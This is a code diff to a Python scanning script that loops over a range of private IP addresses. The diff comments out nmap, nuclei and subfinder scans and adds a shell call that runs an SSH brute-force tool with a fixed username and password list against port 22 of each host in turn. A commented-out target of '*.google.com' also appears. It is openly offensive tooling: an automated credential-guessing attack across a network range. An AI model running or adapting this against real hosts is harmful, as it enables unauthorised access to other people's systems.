@@ -1,14 +1,30 @@
 import os
+import httpx
+import re
 
+from helperfuncts import *
 
+ip2 = ""
+ipsplit2 = ""
 
+options = {
+    "nmap": "-r -sV --open -v -A",
+    "subfinder": "-silent",
+    "nuclei": "-rdb -fr -stats -ut",
+}
+
+# ip1 = "*.google.com"
 ip1 = "192.168.10.21"
 ip2 = "192.168.10.51"
 
+
 ipsplit1 = ip1.split(".")
-ipsplit2 = ip2.split(".")
+
+if ip2 != "":
+    ipsplit2 = ip2.split(".")
 
 basedir = "./scan"
+
 
 
 if not os.path.exists(f"{basedir}"):
@@ -23,13 +39,21 @@ for dir in dirs:
 def dostuff(ip):
     print(ip)
 
-    os.system(f'nmap {ip} -r -sV --open -oN {basedir}/nmap/{ip}.txt -v')
+    # os.system(f'nmap {filterip(ip)} -oN {basedir}/nmap/{ip}.txt {options["nmap"]}')
+    
+    # # os.system(f'nuclei -u {gethttporhtp(ip)} -o {basedir}/nuclei/{filterip(ip)}.txt {options["nuclei"]}')
+    
+    # os.system(f'subfinder -d {filterip(ip)} -o {basedir}/subfinder/{filterip(ip)}.txt {options["subfinder"]}')
+
+
+    os.system(f'python3 libs/programs/SSHBrute/ssh-brute.py --hostname {ip} --port 22 --user killerb --passlist sshpass.txt --background >> {basedir}/sshs.txt')
 
 
 
-
-
-while int(ipsplit1[-1]) < int(ipsplit2[-1]):
-    dostuff(".".join(ipsplit1))
-    ipsplit1[-1]=str(int(ipsplit1[-1])+1)
+if ip2 == "":
+    dostuff(ip1)
+else:
+    while int(ipsplit1[-1]) < int(ipsplit2[-1]):
+        dostuff(".".join(ipsplit1))
+        ipsplit1[-1]=str(int(ipsplit1[-1])+1)
 
